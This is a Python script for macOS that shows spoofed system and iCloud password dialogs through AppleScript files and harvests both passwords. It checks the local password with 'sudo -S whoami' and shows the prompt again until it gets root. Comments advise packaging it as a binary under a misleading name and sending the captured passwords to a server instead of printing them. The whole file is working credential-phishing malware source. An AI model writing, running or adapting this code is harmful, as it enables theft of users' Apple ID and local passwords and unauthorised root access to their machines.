import subprocess
import checkiCloudEmail
from time import sleep

# Arguments
# localpass
# icloud pass
# < there is the nbsp
# Generate binary, put in applications, use open -a /Application/[name], what ever the binary is named is what requests permission. You can rename after generation. Instead of print pipe it out to server

def promptSystem():
    try:
        run_command = subprocess.check_output(
        "osascript /Applications/system.applescript", shell=True)
    except subprocess.CalledProcessError:
        pass
    return run_command.rstrip()

def promptiCloud():
    try:
        run_command = subprocess.check_output(
        "osascript /Applications/icloud.applescript {0}".format(checkiCloudEmail.checkEmail()), shell=True)
    except subprocess.CalledProcessError:
        pass
    return run_command

def tryRoot(pw):
    try:
        return subprocess.check_output(
        "echo '{0}' | sudo -S whoami".format(pw), shell=True)
    except subprocess.CalledProcessError:
        return "FALSE"

if __name__ == "__main__":
    icloudpass = promptiCloud()
    # print icloudpass
    localpass = promptSystem()
    # print "ITSSSS" + tryRoot(localpass)
    while "root" not in tryRoot(localpass):
        localpass = promptSystem()
    # while tryRoot(localpass) is not True:
    #     sleep(10)
    #     localpass = promptSystem()
    # print localpass
